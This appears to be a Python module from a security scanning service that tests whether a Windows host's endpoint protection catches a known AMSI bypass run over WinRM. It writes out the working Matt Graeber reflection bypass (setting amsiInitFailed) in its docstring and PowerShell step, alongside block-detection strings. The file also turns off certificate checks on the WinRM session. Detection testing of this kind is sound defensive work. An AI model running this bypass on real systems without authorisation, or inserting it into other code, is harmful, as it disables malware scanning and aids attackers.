"""amsi_bypass_detection_test - AMSI bypass detection probe.

What it does:
  Connects to a Windows target over WinRM (pywinrm) and runs a single
  PowerShell session that:

    1. Probes baseline (`Get-Process -Name notepad -ErrorAction SilentlyContinue`
       just to confirm shell works).
    2. Submits the PUBLIC Matt Graeber AMSI bypass primitive:
           $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
           $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
           $field.SetValue($null, $true)
       (Public since 2016 - signed by every Defender/Falcon/S1 ruleset.)
    3. After the bypass, runs a follow-up benign cmd: `Get-Process powershell`.

  We then evaluate three possible outcomes:
    a. AMSI BLOCKED the bypass line: EDR caught the textbook string.
       This is the GOOD case -> POSITIVE finding.
    b. AMSI did NOT block, but the SecureString tripped Defender's static
       scan / EDR rule (we see `ScriptBlockLoggingFailed` or `AmsiScanBuffer
       returned blocked`): GOOD -> POSITIVE.
    c. AMSI did NOT block AND the follow-up Get-Process ran successfully:
       BAD -> HIGH (the EDR has no AMSI runtime hooking, or it's been
       neutralised by an attacker who controls the host).

What this probe is NOT:
  - Not an actual AMSI bypass for malicious use (no payload is executed
    afterwards).
  - Not a malware sample drop - everything is in-memory and inert.

MITRE: T1562.001 (Disable or Modify Tools - AMSI)
CWE  : CWE-693 (Protection Mechanism Failure)

Customer input via ScanRequest.options:
  - username      Windows account (DOMAIN\\user or .\\local) (required)
  - password      account password (required)
  - port          WinRM port (default 5985 http, 5986 https)
  - use_ssl       bool (default false; true -> 5986)
  - timeout_sec   per-cmd cap (default 30)
"""
from __future__ import annotations
import asyncio
from typing import Optional

from fastapi import APIRouter, Depends
from pydantic import BaseModel

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext, run_scanner
from tools._payloads.amsi_bypass_detection_test_findings import (
    AMSI_BYPASS_DETECTION_TEST_FINDING_RULES,
)

router = APIRouter()

try:
    import winrm   # noqa: F401
    _WINRM_OK = True
except Exception:
    _WINRM_OK = False

DEFAULT_PORT_HTTP = 5985
DEFAULT_PORT_HTTPS = 5986
DEFAULT_TIMEOUT = 30

# Three discrete PS commands, executed in sequence. We tag each with a
# marker so we can correlate WinRM stdout/stderr back to the originating
# step even if the AMSI block aborts before later writes.
PS_STEP_BASELINE = r"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Output '== BASELINE-BEGIN =='
$null = Get-Process -Name powershell -ErrorAction SilentlyContinue
Write-Output 'BASELINE-OK'
Write-Output '== BASELINE-END =='
""".strip()

# Public Matt Graeber AMSI bypass primitive. Signed by every modern EDR
# AMSI ruleset since ~2016. The bypass itself is inert without a payload
# following it; we use it as a tripwire for the customer's detection.
PS_STEP_BYPASS = r"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Output '== BYPASS-BEGIN =='
try {
    $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($ref) {
        $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
        if ($field) {
            $orig = $field.GetValue($null)
            $field.SetValue($null, $true)
            Write-Output 'BYPASS-SET-TRUE'
            # Restore original immediately so we don't leave the box in a
            # mutated state if the customer's EDR didn't catch it.
            $field.SetValue($null, $orig)
            Write-Output 'BYPASS-RESTORED'
        } else { Write-Output 'BYPASS-NO-FIELD' }
    } else { Write-Output 'BYPASS-NO-TYPE' }
} catch {
    Write-Output ('BYPASS-EXCEPTION|' + $_.Exception.GetType().FullName + '|' + $_.Exception.Message)
}
Write-Output '== BYPASS-END =='
""".strip()

# Follow-up benign command. If this runs to completion AFTER the bypass
# string was submitted, AMSI is not catching the bypass primitive.
PS_STEP_FOLLOWUP = r"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Output '== FOLLOWUP-BEGIN =='
$p = Get-Process -ErrorAction SilentlyContinue | Select-Object -First 1
if ($p) { Write-Output ('FOLLOWUP-OK|' + $p.Name) } else { Write-Output 'FOLLOWUP-EMPTY' }
Write-Output '== FOLLOWUP-END =='
""".strip()


def _do_winrm(host, port, use_ssl, user, password, timeout):
    """Run all 3 steps synchronously via a single pywinrm Session.
    Each step returns a dict with stdout/stderr/rc; AMSI block on step 2
    usually surfaces as rc=1 with stderr containing 'AmsiScanBuffer'."""
    import winrm
    scheme = "https" if use_ssl else "http"
    endpoint = f"{scheme}://{host}:{port}/wsman"
    s = winrm.Session(
        endpoint,
        auth=(user, password),
        transport="ntlm",
        server_cert_validation="ignore",
        operation_timeout_sec=timeout,
        read_timeout_sec=timeout + 5,
    )
    try:
        out = {}
        for label, script in (
            ("baseline", PS_STEP_BASELINE),
            ("bypass",   PS_STEP_BYPASS),
            ("followup", PS_STEP_FOLLOWUP),
        ):
            try:
                r = s.run_ps(script)
                out[label] = {
                    "stdout": (r.std_out or b"").decode("utf-8", errors="replace"),
                    "stderr": (r.std_err or b"").decode("utf-8", errors="replace"),
                    "rc": r.status_code,
                }
            except Exception as e:
                # WinRM may raise mid-stream if the EDR ripped the channel
                out[label] = {"_step_error": str(e)[:300]}
        return out
    except Exception as e:
        msg = str(e)
        low = msg.lower()
        if "401" in msg or "unauthorized" in low or "authentication failed" in low:
            return {"_auth_failed": True, "_msg": msg[:300]}
        return {"_conn_error": msg[:300]}


def _evaluate(steps: dict) -> dict:
    """Combine the 3-step results into bypass-success / EDR-caught flags."""
    out = {
        "baseline_ok": False,
        "bypass_set_true": False,
        "bypass_restored": False,
        "bypass_blocked": False,
        "followup_ok": False,
        "amsi_signature_hit": False,
        "raw_summary": [],
    }
    base = steps.get("baseline") or {}
    if "BASELINE-OK" in (base.get("stdout") or ""):
        out["baseline_ok"] = True

    byp = steps.get("bypass") or {}
    bs = byp.get("stdout") or ""
    be = byp.get("stderr") or ""
    if "BYPASS-SET-TRUE" in bs:
        out["bypass_set_true"] = True
    if "BYPASS-RESTORED" in bs:
        out["bypass_restored"] = True
    low = (bs + " " + be).lower()
    # Common AMSI / Defender block signatures
    if ("amsiscanbuffer" in low or
        "this script contains malicious content" in low or
        "blocked by your antivirus" in low or
        "operation did not complete successfully because" in low or
        (byp.get("rc") and byp.get("rc") != 0 and "amsi" in low)):
        out["bypass_blocked"] = True
        out["amsi_signature_hit"] = True

    fu = steps.get("followup") or {}
    if "FOLLOWUP-OK" in (fu.get("stdout") or ""):
        out["followup_ok"] = True

    # Build a short raw summary for the finding evidence (no creds, no PII)
    for label, st in steps.items():
        if not isinstance(st, dict):
            continue
        if st.get("_step_error"):
            out["raw_summary"].append(f"{label}: ERR {st['_step_error'][:80]}")
            continue
        sum_line = f"{label}: rc={st.get('rc')} stdout={(st.get('stdout') or '')[:80].replace(chr(10), ' ')}"
        out["raw_summary"].append(sum_line[:160])
    return out


async def gather(ctx: ScanContext):
    target = ctx.host
    if not target:
        ctx.state["amsi_bypass_detection_test_total"] = 0
        ctx.source("no-target")
        return
    if not _WINRM_OK:
        ctx.state["amsi_bypass_detection_test_error"] = "pywinrm not installed"
        ctx.source("pywinrm missing")
        return

    opts = ctx.state.get("_options") or {}
    user = (opts.get("username") or "").strip()
    password = opts.get("password") or ""
    if not user or not password:
        ctx.state["amsi_bypass_detection_test_total"] = 0
        ctx.state["amsi_bypass_creds_missing"] = True
        ctx.source("missing WinRM creds")
        return

    use_ssl = bool(opts.get("use_ssl"))
    port = int(opts.get("port") or (DEFAULT_PORT_HTTPS if use_ssl else DEFAULT_PORT_HTTP))
    timeout = min(max(int(opts.get("timeout_sec") or DEFAULT_TIMEOUT), 10), 120)

    try:
        result = await asyncio.wait_for(
            asyncio.to_thread(_do_winrm, target, port, use_ssl, user, password, timeout),
            timeout=timeout * 4,
        )
    except asyncio.TimeoutError:
        ctx.state["amsi_bypass_detection_test_error"] = "winrm timeout"
        ctx.state["amsi_bypass_detection_test_total"] = 0
        ctx.source("winrm timeout")
        return

    if result.get("_auth_failed"):
        ctx.state["amsi_bypass_winrm_auth_failed"] = True
        ctx.state["amsi_bypass_detection_test_total"] = 0
        ctx.source("winrm auth failed")
        return
    if result.get("_conn_error"):
        ctx.state["amsi_bypass_detection_test_error"] = f"winrm: {result['_conn_error']}"
        ctx.state["amsi_bypass_detection_test_total"] = 0
        ctx.source("winrm connect error")
        return

    evald = _evaluate(result)
    ctx.state["amsi_bypass_baseline_ok"]   = evald["baseline_ok"]
    ctx.state["amsi_bypass_set_true"]      = evald["bypass_set_true"]
    ctx.state["amsi_bypass_restored"]      = evald["bypass_restored"]
    ctx.state["amsi_bypass_blocked"]       = evald["bypass_blocked"]
    ctx.state["amsi_bypass_followup_ok"]   = evald["followup_ok"]
    ctx.state["amsi_bypass_signature_hit"] = evald["amsi_signature_hit"]
    ctx.state["amsi_bypass_summary"]       = evald["raw_summary"]

    # We always count "1" run (the technique ran) so the orchestrator
    # tile shows non-zero activity; severity is decided by finding rules.
    ctx.state["amsi_bypass_detection_test_total"] = 1
    ctx.source(
        f"winrm://{user}@{target}:{port} -> "
        f"baseline={'OK' if evald['baseline_ok'] else 'FAIL'} "
        f"bypass={'BLOCKED' if evald['bypass_blocked'] else 'NOT-BLOCKED'} "
        f"followup={'OK' if evald['followup_ok'] else 'FAIL'}"
    )


INTEL_FIELDS = [
    ("WinRM port",              "amsi_bypass_target_port"),
    ("Baseline shell",          "amsi_bypass_baseline_ok"),
    ("Bypass primitive set",    "amsi_bypass_set_true"),
    ("Bypass blocked by EDR",   "amsi_bypass_blocked"),
    ("AMSI signature hit",      "amsi_bypass_signature_hit"),
    ("Follow-up ran",           "amsi_bypass_followup_ok"),
    ("Step summary",            "amsi_bypass_summary"),
]


class AmsiBypassRequest(ScanRequest):
    options: Optional[dict] = None


@router.post("/api/av_evasion/amsi_bypass_detection_test")
async def av_evasion_amsi_bypass_detection_test(
    req: AmsiBypassRequest, _=Depends(verify_scan_quota),
):
    options = req.options or {}

    async def _gather_with_options(ctx: ScanContext):
        ctx.state["_options"] = options
        use_ssl = bool(options.get("use_ssl"))
        ctx.state["amsi_bypass_target_port"] = int(
            options.get("port") or (DEFAULT_PORT_HTTPS if use_ssl else DEFAULT_PORT_HTTP)
        )
        await gather(ctx)

    return await run_scanner(
        host=req.target,
        tool="amsi_bypass_detection_test",
        gather_func=_gather_with_options,
        finding_rules=AMSI_BYPASS_DETECTION_TEST_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
        flat_field_keys=[],
    )


def register(app):
    app.include_router(router)
